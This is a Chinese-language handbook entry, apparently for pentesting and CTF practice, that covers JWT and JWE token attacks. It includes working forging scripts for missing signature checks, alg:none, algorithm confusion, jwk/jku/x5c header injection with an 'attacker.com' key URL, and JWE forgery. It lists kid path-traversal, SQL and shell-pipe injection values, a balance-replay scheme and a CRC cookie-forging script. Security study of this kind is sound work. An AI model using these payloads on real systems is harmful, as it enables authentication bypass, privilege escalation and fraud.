---

phase: webapp
vuln_class: [jwt, auth]
title: JWT 与 JWE 令牌攻击
summary: JWT/JWE 攻击的唯一判据：服务端在验证时信任了哪个可被攻击者控制的输入。按「签名不校验 / 密钥可推导 / 密钥可注入 / 声明被信任」四类分。
---

# JWT 与 JWE 令牌攻击

通用认证绕过、越权、会话攻击见 [[web/漏洞分类/认证与会话/认证与访问控制攻击.md|auth-and-access.md]]；OAuth/OIDC、SAML、CI/CD 凭证窃取见 [[web/漏洞分类/认证与会话/联邦认证与身份基础设施攻击.md|auth-infra.md]]。

## 0. 判据速查

JWT 的每一层都可以是攻击面。**先判断服务端信任了哪一层**，再选手法 —— 盲试 `alg:none` 在现代库上基本无效。

| 观察到的现象 | 说明 | 去哪节 |
|---|---|---|
| 三段 token，改 payload 后**签名原样保留**仍被接受 | 服务端根本没验签（只 `decode` 不 `verify`） | §1.1 |
| `alg:none` 被接受 | 库版本老 / 手写了验证逻辑 | §1.2 |
| `alg` 改成 `HS256` 后能用**公钥字符串**当密钥签成功 | 算法混淆：同一 key 参数被两种算法复用 | §1.3 |
| 弱口令字典能跑出密钥 | HS256 + 人类可猜密钥 | §2.1 |
| 头部塞 `jwk` 且被接受 | 服务端**从 token 里取公钥** | §3.1 |
| 头部塞 `jku` / `x5u` 且服务端发起了外发请求 | 服务端**从 URL 取公钥**（顺带 SSRF） | §3.2 |
| 头部塞 `x5c` 且被接受 | 服务端**从 token 里取证书链** | §3.3 |
| `kid` 可控 | 拼进文件路径 / SQL / 命令 | §3.4 |
| token **五段**而非三段 | 是 JWE（加密），不是 JWT（签名） | §4 |
| 余额/权限/角色直接写在 claims 里且被业务使用 | 声明被信任，跟签名无关 | §5 |
| cookie 解密后是「长度前缀 + 非 MAC 校验」结构 | 长度字段截断 + CRC 重算 | §6 |

**核心判据一句话**：签名正确不代表声明可信，加密正确也不代表身份可信。漏洞永远在「服务端把哪个输入当成了权威」。

---

## 1. 签名校验缺失

### 1.1 完全不验签

部分库把 `decode()`（只解析）和 `verify()`（验签）分成两个函数。服务端只调前者时，签名形同注释。

```python
import jwt, base64, json

token = "eyJ..."
h, p, s = token.split('.')
payload = json.loads(base64.urlsafe_b64decode(p + '=='))
payload['sub'] = 'administrator'
new_p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
forged = f"{h}.{new_p}.{s}"     # 签名原样保留
```

**判据**：改 payload、**保留原签名**，如果仍被接受 → 根本不验签。这一步比 `alg:none` 更该先试，因为它不需要服务端有「支持 none」的缺陷。

### 1.2 `alg: none`

去掉签名段，头部改 `{"alg":"none"}`。变体：`None` / `NONE` / `nOnE` —— 大小写处理不严的库会漏。

现代库（`jsonwebtoken` ≥9、`PyJWT` ≥2.4、`jose`）默认拒绝，但仍会遇到手写验证或老版本。**先试 1.1，再试这个。**

### 1.3 算法混淆（RS256 → HS256）

前提：服务端用**同一个 key 参数**同时支持非对称和对称算法，且公钥可获取（`/jwks.json`、`/api/key`、页面源码、证书）。

HS256 把「密钥」当 HMAC secret 用。攻击者把 `alg` 改成 `HS256`，用**公钥的 PEM 字符串**当 HMAC 密钥签名 —— 服务端拿同一个公钥字符串验，就通过了。

```javascript
const jwt = require('jsonwebtoken');
const publicKey = '-----BEGIN PUBLIC KEY-----\n...\n-----END PUBLIC KEY-----';
const token = jwt.sign({ username: 'admin' }, publicKey, { algorithm: 'HS256' });
```

**坑**：PEM 的换行、结尾 `\n`、有无 `-----END-----` 都会影响 HMAC 结果。要按服务端实际读取的**原始字节**来签，逐种格式试。

---

## 2. 密钥可推导

### 2.1 弱密钥爆破

```bash
# 只对 HS256/HS384/HS512 有意义；RS/ES 系列没有「弱密钥」概念
hashcat -m 16500 jwt.txt wordlist.txt
```

`-m 16500` 是 JWT 模式。字典优先用 `jwt-secrets`、`rockyou`、以及**项目名/域名/版本号**变体 —— CTF 和真实项目里密钥常是产品名。

**别混**：`flask-unsign` 解的是 **Flask session cookie**（`itsdangerous` 签名），不是 JWT。两者都是 base64 但结构不同。Flask cookie 的对应手法是爆破 `SECRET_KEY` 后直接伪造整个 session。

### 2.2 密钥从已知数据派生

若密钥是 `md5(username)`、`sha1(固定串+id)` 之类，拿到任意一个已知用户的 token 就能反推，进而伪造他人。

**判据**：注册两个账号，比较各自 token 的签名是否随可控字段变化（比如只改用户名，签名跟着变但可预测）。

---

## 3. 密钥来源被注入

这一类是 JWT 里**收益最高**的：不需要猜密钥，直接让服务端用攻击者的密钥。

### 3.1 `jwk` 头注入

服务端从 token 头部的 `jwk` 字段读公钥来验签 —— 攻击者自带密钥对，公私都在手上。

```python
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
import jwt, base64

priv = rsa.generate_private_key(65537, 2048, default_backend())
n = priv.public_key().public_numbers()

b64 = lambda x: base64.urlsafe_b64encode(
    x.to_bytes((x.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode()

jwk = {"kty": "RSA", "kid": original_header.get('kid'), "e": b64(n.e), "n": b64(n.n)}
forged = jwt.encode({"sub": "administrator"}, priv, algorithm='RS256', headers={'jwk': jwk})
```

### 3.2 `jku` 头注入

服务端按 `jku` 里的 URL 去拉 JWKS。把 URL 指向自己的服务器，放自己的公钥。

```python
# 1. 自建 JWKS（webhook.site / 自己的 vps）
jwks = {"keys": [attacker_jwk]}

# 2. 伪造 token 指向它
forged = jwt.encode({"sub": "administrator"}, attacker_priv, algorithm='RS256',
                    headers={'jku': 'https://attacker.com/.well-known/jwks.json'})
```

**顺带是 SSRF**：即使服务端校验了签名算法、拒绝了这个 token，`jku` 被请求这件事本身就是盲 SSRF，可用于探测内网。校验常只做「是不是 http(s) 开头」或域名黑名单，用 `@`、`#`、短域名、DNS 重绑定、开放重定向都能绕。

### 3.3 `x5c` / `x5u` 头注入

与 JKU 同族，原文常漏：

- `x5c`：内嵌 **X.509 证书链**（base64 DER 数组）。服务端从第一个证书取公钥时，取到的就是攻击者的证书。
- `x5u`：证书链的 URL，行为等同 `jku`。

判据与 3.1/3.2 一致：只要头部出现这几个字段且服务端**没有拒绝**，就逐个试。

### 3.4 `kid` 注入

`kid` 是「用哪把钥匙」的选择器。它被拼进文件路径、SQL 或 shell 时就是注入点。

**路径穿越 → 让密钥变成可预测内容：**

```python
# /dev/null 读出空字节 → HMAC 密钥是空串
forged = jwt.encode({"sub": "administrator"}, '',
                    algorithm='HS256', headers={"kid": "../../../dev/null"})

# 其他可预测内容
# ../../../proc/sys/kernel/hostname   → 主机名（常可猜/可泄露）
# ../../../etc/hostname
```

**SQL 注入 → 让查询返回已知密钥：**

```sql
' UNION SELECT 'known-secret' -- 
```

**命令注入 → 让 shell 输出已知内容：**

```
kid = "key1' | echo known-secret"
```

判据：把 `kid` 改成不存在/异常值，看报错里有没有路径、SQL 或命令痕迹。

---

## 4. JWE：加密不等于认证

JWE 是**加密**（5 段：`header.enckey.iv.ciphertext.tag`），JWT 是**签名**（3 段）。**段数是第一判据。**

服务端用私钥解密 JWE。**如果公钥暴露**（`/api/key`、`/.well-known/jwks.json`、页面源码、前端 JS 硬编码），攻击者就能用公钥加密任意 claims，服务端解密后照单全收。

```python
from jwcrypto import jwk, jwe
import json

key = jwk.JWK.from_pem(public_key_pem.encode())

forged_claims = {"sub": "attacker", "balance": 999999, "role": "admin"}

token = jwe.JWE(
    json.dumps(forged_claims).encode(),
    recipient=key,
    protected=json.dumps({
        "alg": "RSA-OAEP-256",   # 或 RSA-OAEP / RSA1_5
        "enc": "A256GCM"         # 或 A128CBC-HS256
    })
)
forged_jwe = token.serialize(compact=True)
```

**判据**：拿到的 token 是 5 段 → 立刻去找公钥端点。只要公钥能拿到，且服务端「解密即信任」，就能伪造。

**坑**：
- `alg`/`enc` 必须和服务端实际支持的一致，否则解密失败可能静默回落到匿名态或直接报错。常见组合都试一遍：`RSA-OAEP-256`+`A256GCM`、`RSA-OAEP`+`A128CBC-HS256`、`RSA1_5`+`A128CBC-HS256`。
- 注意**嵌套 JWT**（JWE 里套 JWS，头部有 `cty: JWT`），别把内层当外层处理。

---

## 5. 声明被信任（与签名无关）

签名完全正确，但服务端把 claims 里的**业务数据**当权威 —— 这类漏洞不需要破任何密码学。

典型：余额、角色、租户 ID、权限位、价格、过期时间写在 token 里，服务端只验签不核对数据库。

**重放 + 结算组合**（题目例证：MetaShop 类「充值/退款」题）：

1. 注册拿到 `balance=100` 的 token，**存下来**
2. 消费到 `balance=0`
3. 把旧 token 塞回 cookie → 余额回到 100
4. 触发退款 → 服务端按 token 里的 100 累加
5. 循环到足够金额

**判据**：任何「服务端读 token 里的数值做计算」的地方都要试。单独重放只是逻辑漏洞，和退款/结算组合才放大。

---

## 6. 长度字段 + 非 MAC 校验的会话 cookie

不限于 JWT。但凡 cookie 解密后是 `字段¡值÷字段¡值÷…` 这种带**长度前缀**的结构、且完整性用 CRC32/adler32/md5 而非 HMAC，就能伪造。

**原理**：CRC32 是线性校验，不是 MAC。改密文再重算 CRC 依然「合法」；配合长度字段告诉解析器「只解到第 N 字节」，就能在任意位置截断或延长明文。

```python
import struct, zlib, base64, requests

# 1. 注册时把目标字段提前埋进可控输入
payload_fields = b"name\xa1attacker\xf7id\xa11\xf7role\xa1user\xf7"

sess = requests.Session()
sess.post("http://target/register",
          data={"user": "attacker", "pass": "x", "payload": payload_fields})
cookie = base64.b64decode(sess.cookies["session"])

ct, rest = cookie[:-6], cookie[-6:]        # 尾部 2 字节长度 + 4 字节 CRC32
truncated_plain = b"name\xa1attacker\xf7id\xa11\xf7"

new_len = struct.pack("<H", len(truncated_plain))
new_crc = struct.pack("<I", zlib.crc32(ct[:len(truncated_plain)]))
forged = base64.b64encode(ct[:len(truncated_plain)] + new_len + new_crc)
sess.cookies["session"] = forged.decode()
print(sess.get("http://target/admin").text)
```

（题目例证：DefCamp CTF Qualification 2018 — Get Admin）

**判据**：cookie 是 base64/hex，解开后是定长尾部（长度 + 校验）或字段分隔符（`\xa1`/`\xf7`/`|`/`;`），就去查校验算法。是 `crc32`、`adler32`、`md5`、`sha1` 而**不是 HMAC/AEAD** → 直接假定可伪造。

---

## 7. 纪律

- **先确认服务端信任哪一层**。不验签（§1.1）和密钥注入（§3）是两条完全不同的路，判错就白打。最省事的起手式是「改 payload 保留签名」。
- **`alg:none` 不是首选**。现代库默认拒绝，先试无验签和算法混淆，收益更高。
- **报的是越权不是「JWT 弱」**。成果要落到「伪造了 admin 身份、读到了 X 数据」，而不是「发现了 JWT」。
- **`jku`/`x5u` 别只当 token 伪造**：即使签名过不了，外发请求本身就是 SSRF，可以单独成漏洞。
- **公钥暴露要当成高危信号**：JWE 场景下公钥 = 伪造能力；JWT 场景下公钥 = 算法混淆的原料。看到 `/jwks.json`、`/api/key` 就记下来。
- **别把 CRC 当签名**。审代码时看到校验字段，第一件事是看它是不是 MAC。
